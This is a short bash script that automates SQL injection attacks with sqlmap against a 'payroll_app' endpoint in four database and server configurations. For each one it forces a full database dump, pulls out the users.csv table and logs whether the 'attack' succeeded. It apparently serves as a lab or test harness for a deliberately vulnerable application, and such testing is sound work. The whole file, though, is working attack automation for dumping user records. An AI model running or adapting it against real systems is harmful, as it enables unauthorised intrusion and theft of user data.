TARGET=$1
DATABASE=$2
SERVER=$3

if [[ ($DATABASE == "mysql") && ($SERVER == "php") ]]
then 
	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=MySQL --answers="force=Y" --dump 
	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
	FILE=~/users.csv
	if test -f "$FILE"
	then
		echo "$(date)   -->    MySQL, PHP  -->   Attack Successful" >> ~/attack-log.txt
	else
		echo "$(date)   -->    MySQL, PHP  -->   Attack Failed" >> ~/attack-log.txt
	fi
	rm ~/users.csv
elif [[ ($DATABASE == "postgresql") && ($SERVER == "php") ]]
then
	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=postgresql --answers="force=Y" --dump 
	FILE=~/users.csv
	mv ~/.sqlmap/output/$TARGET/dump/public/users.csv ~/ 
	if test -f "$FILE"
	then
		echo "$(date)   -->    PostgreSQL, PHP  -->   Attack Successful" >> ~/attack-log.txt
	else
		echo "$(date)   -->    PostgreSQL, PHP  -->   Attack Failed" >> ~/attack-log.txt
	fi
	rm ~/users.csv
elif [[ ($DATABASE == "mysql") && ($SERVER == "py") ]]
then
	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=MySQL --answers="force=Y" --dump 
	FILE=~/users.csv
	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/ 
	if test -f "$FILE"
	then
		echo "$(date)   -->    MySQL, Python  -->   Attack Successful" >> ~/attack-log.txt
	else
		echo "$(date)   -->    MySQL, Python  -->   Attack Failed" >> ~/attack-log.txt
	fi
	rm ~/users.csv
elif [[ ($DATABASE == "postgresql") && ($SERVER == "py") ]]
then
	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=postgresql --answers="force=Y" --dump 
	FILE=~/users.csv
	mv ~/.sqlmap/output/$TARGET/dump/public/users.csv ~/ 
	if test -f "$FILE"
	then
		echo "$(date)   -->    PostgreSQL, Python  -->   Attack Successful" >> ~/attack-log.txt
	else
		echo "$(date)   -->    PostgreSQL, Python  -->   Attack Failed" >> ~/attack-log.txt
	fi
	rm ~/users.csv
else
	echo "Not a valid configuration."
fi

